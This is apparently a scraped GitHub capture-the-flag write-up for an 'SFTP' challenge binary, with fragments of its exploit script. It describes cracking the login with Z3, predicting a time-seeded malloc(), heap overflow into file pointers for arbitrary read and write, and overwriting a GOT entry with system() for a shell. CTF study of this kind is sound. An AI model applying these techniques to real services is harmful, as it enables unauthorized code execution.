@@ -1,0 +1,163 @@
+10307-bin,1,Skip to content
+10307-bin,2,Sign up
+10307-bin,3,Hosting
+10307-bin,4,Explore
+10307-bin,5,Explore GitHub →
+10307-bin,6,Learn & contribute
+10307-bin,7,Learning Lab
+10307-bin,8,Connect with others
+10307-bin,9,Compare plans
+10307-bin,10,Jump to
+10307-bin,11,Jump to
+10307-bin,12,Jump to
+10307-bin,13,Sign in
+10307-bin,14,Sign up
+10307-bin,15,Watch
+10307-bin,16,Fork
+10307-bin,17,Pull requests
+10307-bin,18,Pull requests
+10307-bin,19,Go to file
+10307-bin,20,Git stats
+10307-bin,21,Failed to load latest commit information.
+10307-bin,22,"Easily bypass the password check using a very simple Z3 script (it was also brute-forcable, but I decided to do it in a more elegant way :P)"
+10307-bin,23,"A poor malloc() implementation, relies on srand(time(NULL))."
+10307-bin,24,Predict the result returned from rand() (used in malloc()).
+10307-bin,25,Leak an address to verify our prediction (optional).
+10307-bin,26,Find 2 points in time where we can get 2 malloc() calls relatively (65535> bytes apart) close to each other.
+10307-bin,27,"Make one of the calls to be a user-controlled data, and the other a pointer that is used to read and write data."
+10307-bin,28,"(Such pointer exists, it actually is: file_entry.data)"
+10307-bin,29,"The service allows us to connect to an ""SFTP"" server"
+10307-bin,30,We quickly notice the service requires a password authentication.
+10307-bin,31,"After authenticating, the service allows us to do several things, similarly to what an SFTP server would allow us to do."
+10307-bin,32,"We can create a file, create a directory, create a symlink, read a file, write to a file, delete a file, etc.."
+10307-bin,33,Bypassing the authentication
+10307-bin,34,"After reading the disassembly of the function that is responsible for the authentication, we noticed that this can not only be reversed, but it can also be brute-forced quite easily."
+10307-bin,35,"Yet, we decided to write a Z3 script to reverse the ""hashing"" process and retreive the password."
+10307-bin,36,The script can be found below and also in the find_password.py script attached below.
+10307-bin,37,"After bypassing the authentication, we can find an sftp.c source file under /home/src/sftp.c, this file is handy and saves quite some reversing time"
+10307-bin,38,(Note: the sftp.c source and flag dummy file are embedded within the binary and decrypted in runtime)
+10307-bin,39,"The bug in this challenge is the way malloc(), realloc() and free() are implemented."
+10307-bin,40,malloc()'s functionality can be simplified to the following code:
+10307-bin,41,"Basically, malloc() will return a random address within the following address range:"
+10307-bin,42,"When we search for the corresponding srand call, we find a call to srand occurs once, when the binary loads."
+10307-bin,43,"In the same function, the program also mmap()s the following address range:0x40000000 - 0x60100000 as RW memory."
+10307-bin,44,The problem relies in the fact that malloc() returns a pointer based on the result of that rand() call
+10307-bin,45,"So, theoretically, if we know what the is result of the rand() call, we can also know what malloc() will return!"
+10307-bin,46,"Using the same ""mind-set"", if we can predict what malloc() will return, we can also trick malloc to return 2 (relatively) close addresses when we call it twice."
+10307-bin,47,"So, let's try to break srand, rand() and finally, malloc()! :)"
+10307-bin,48,The exploit consists of a few parts:
+10307-bin,49,Synchronize (if needed) the exploit's timer with the server's timer.
+10307-bin,50,"Synchornize with the server's rand() calls, to allow us a reliable exploit and a reliable malloc() prediction."
+10307-bin,51,"After some digging, we noticed that the first rand() call returns the ""home"" node address (will be explained in pt"
+10307-bin,52,"5), and the next 5 rand() calls are always made."
+10307-bin,53,"By knowing that, we can consistently know the home directory_entry address, and"
+10307-bin,54,all of the results that malloc() will return!
+10307-bin,55,"Search for 2 points in time, where malloc() would return relatively (<65535 bytes apart) close addresses."
+10307-bin,56,Use these points in time in such a way that:
+10307-bin,57,"One of the points in time (will be referred to as ""victim"") will be a file_entry struct, whose char* data field will be overwritten later on."
+10307-bin,58,"The second point in time (will be referred to as ""writer"") will overflow into the victim, and overwrite it's char* data field, and optionally also the size_t size field as well."
+10307-bin,59,"Leak a binary address using the prediction of the home (""/home/c01db33f"") directory_entry struct (Which is the result of the first malloc(), and as we already know, we can predict the result it'll return!)."
+10307-bin,60,"We'll overflow into a file_entry struct, and change the pointer to be home's directory_entry struct address."
+10307-bin,61,"By doing so, when we read the file's content, we'll get the data that resides in the directory_entry struct, allowing us to leak an address in the binary ;D"
+10307-bin,62,"Leak a libc address by overflowing into a file_entry's char* data field, we can change it to be an a GOT address, by reading from there we are able to leak an address in libc!"
+10307-bin,63,"Overwrite the GOT entry of _isoc99_scanf() with system(), allowing us to obtain a shell!"
+10307-bin,64,"In the function new_entry(), there's a call to strcpy() which allows us to leak data if we simply write a 24 bytes long directory name, and then we make a symlink to it"
+10307-bin,65,"The read will also print off the next 4 bytes from the link_entry struct, which happens to be 4 bytes from the entry* target field (A pointer to the mmapd() region; This allows us to verify our prediction since the leaked pointer is the a pointer returned by malloc()!)."
+10307-bin,66,This is how we can verify our malloc() predictions.
+10307-bin,67,"After verifying our predictions, finding good ""victim"" and ""writer"" candidates, we can do the following to achieve code execution (As explained in the ""The Exploit"" section):"
+10307-bin,68,"Overflowing to the ""victim"" using the ""writer"", and overwriting the char* data field with the home directory_entry struct address."
+10307-bin,69,By doing so we leak an address in the binary when we read the victim's file content!
+10307-bin,70,"Overflowing to the ""victim"" using the ""writer"", and overwriting the char* data field with a GOT entry address, allowing us to leak an address in libc when we read the victim's file content!"
+10307-bin,71,"Oveflowing into the ""victim"" using the ""writer"", and overwriting the char* data field with a the GOT entry address of __isoc99_scanf(), and writing the address of system() to the ""victim"" file."
+10307-bin,72,"This will overwrite the __isoc99_scanf() GOT entry, with the address of system()!"
+10307-bin,73,Enjoy our sweet shell :)
+10307-bin,74,"The exploit code attached below is very detailed, I added a lot of documentation to it to make the reading of it more convenient."
+10307-bin,75,"(The exploit code is also attached, called exploit.py)"
+10307-bin,76,Exploit Code
+10307-bin,77,# -*- coding: utf-8 -*-
+10307-bin,78,libc = cdll.LoadLibrary('libc.so.6') # Allow a more accurate/fast function results/calls.
+10307-bin,79,PASSWORD = r'@@=``>QPPP@``=' # Retreived using the `find_password.py` Z3-based script.
+10307-bin,80,"#       The `-0` value may vary between locations around the world, since it depends on the server latency as well"
+10307-bin,81,"#       If the exploit does not work remotely, try changing the `-0` value to other negative numbers, i.e.: `-0`, `-1`, etc     #"
+10307-bin,82,sleep_until(match.target_time - (-0 if (not DEBUG) else 0)) # Synchronize with the server if it's a remote exploit.
+10307-bin,83,"log.warning(""Wrong time synchronization!"") # Should not occur"
+10307-bin,84,"If it does, please reach out to me :)"
+10307-bin,85,r.sendline(PASSWORD) # log in using the password we generated.
+10307-bin,86,"#   1) Allocate dummy directories, until we reach the desired rand() result that will       #"
+10307-bin,87,#      produce a good first malloc() address :)                                             #
+10307-bin,88,#   2) Allocate the first file
+10307-bin,89,#   3) Allocate dummy directories until we reach the second file
+10307-bin,90,#   4) Allocate the second file
+10307-bin,91,# Dummy directories to eventually reach our desired malloc() results.
+10307-bin,92,"log.success(""Successfully finished the first padding."")"
+10307-bin,93,# An entity is the malloc_writer / malloc_victim.
+10307-bin,94,"log.info(""Allocating the first entity."
+10307-bin,95,"log.success(""First entity successfully allocated."")"
+10307-bin,96,"log.success(""Successfully finished the second padding."")"
+10307-bin,97,"log.info(""Allocating the second entity.."
+10307-bin,98,#           Functions used to gain                  #
+10307-bin,99,#           Read / Write primitives                 #
+10307-bin,100,"payload is a `struct file_entry`, which looks like:"
+10307-bin,101,the `entry` struct has:
+10307-bin,102,1) a pointer to a directory_entry struct ---> p64(match.home_addr) # home is the directory/cwd when the program runs.
+10307-bin,103,"2) an `entry_type` field, which is an integer --> p32(2) # because 2 is defined to be FILE_ENTRY."
+10307-bin,104,"After overwriting the file_entry, we overwrite the `size` and `data`:"
+10307-bin,105,- p64(length) will overwrite the size.
+10307-bin,106,- p64(address) will overwrite the data (a `char*`)
+10307-bin,107,[!] Arbitrary read primitive.
+10307-bin,108,1) Set the victim's `char* data` field to be the address we want to READ FROM.
+10307-bin,109,2) Set the `size` field to be the AMOUNT OF BYTES we want to read from that address.
+10307-bin,110,3) Read the data from the given address using the fact that we can read data from a `file_entry`!
+10307-bin,111,Return the data read from the address given.
+10307-bin,112,1) Set the victim's address to be the address we want to WRITE TO.
+10307-bin,113,2) Write the data to the given address using the fact that we can write to a `file_entry` that already exists!
+10307-bin,114,- Read 8 bytes from the given address.
+10307-bin,115,#           Exploiting the bugs! :)         #
+10307-bin,116,if length is None:
+10307-bin,117,"r.sendlineafter('sftp> ', 'put ' + file)"
+10307-bin,118,"r.sendlineafter('sftp> ', 'get ' + file)"
+10307-bin,119,"return r.recvuntil('sftp>', drop=True)"
+10307-bin,120,#           Functions used to find the best                         #
+10307-bin,121,"#           Allowing us to predict the malloc() result and thus,    #"
+10307-bin,122,#           Overflow pointers used!                                 #
+10307-bin,123,Return the address of the /home/c01db33f node.
+10307-bin,124,Based on the fact that it's address is based on the first rand() result.
+10307-bin,125,"The 5 predictions in the loop are used to synchronize with the binary's rand() results,"
+10307-bin,126,"since it uses 5 rands() until we ""arrive"" at our rand()."
+10307-bin,127,return home
+10307-bin,128,"Predict the address returned by malloc(), assuming the rand() is synchronized with the server's."
+10307-bin,129,"sorted_lst = sorted(lst) # lst is a list of the results from rand(), hence, we need to sort it first!"
+10307-bin,130,t -- a starting time that we want to start the search for a good malloc diff
+10307-bin,131,Which is built as follows:
+10307-bin,132,* target_time   - The time when we start to create files
+10307-bin,133,Used to synchronize to the server's time.
+10307-bin,134,* malloc_writer - The address that malloc() will return for the WRITER (the `char* data` field!).
+10307-bin,135,"Remember, The writer is the file_entry that'll be used TO overflow into another file."
+10307-bin,136,* malloc_victim - The address that malloc() will return for the victim file.
+10307-bin,137,* home_addr - The address that was generated by malloc() to use for the home directory.
+10307-bin,138,"return ExploitInfo(target_time=t+time_offset,"
+10307-bin,139,"log.info(""Waiting %d seconds.."
+10307-bin,140,This is a standalone function.
+10307-bin,141,Meaning: DON'T CALL verify_pred() AND exploit()!
+10307-bin,142,- Verify a prediction based on an `strcpy()` leak in `entry->name`.
+10307-bin,143,Help
+10307-bin,144,You can't perform that action at this time.
+10307-bin,145,You signed in with another tab or window
+10307-bin,146,Reload to refresh your session.
+10307-bin,147,You signed out in another tab or window
+10307-bin,148,Reload to refresh your session.
+10307-bin,149,We use optional third-party analytics cookies to understand how you use GitHub.com so we can build better products.
+10307-bin,150,Learn more.
+10307-bin,151,Accept
+10307-bin,152,Reject
+10307-bin,153,We use optional third-party analytics cookies to understand how you use GitHub.com so we can build better products.
+10307-bin,154,You can always update your selection by clicking Cookie Preferences at the bottom of the page.
+10307-bin,155,"For more information, see our Privacy Statement."
+10307-bin,156,"We use essential cookies to perform essential website functions, e.g"
+10307-bin,157,they're used to log you in.
+10307-bin,158,Learn more
+10307-bin,159,"We use analytics cookies to understand how you use our websites so we can make them better, e.g"
+10307-bin,160,they're used to gather information about the pages you visit and how many clicks you need to accomplish a task.
+10307-bin,161,Learn more
+10307-bin,162,Accept
+10307-bin,163,Reject
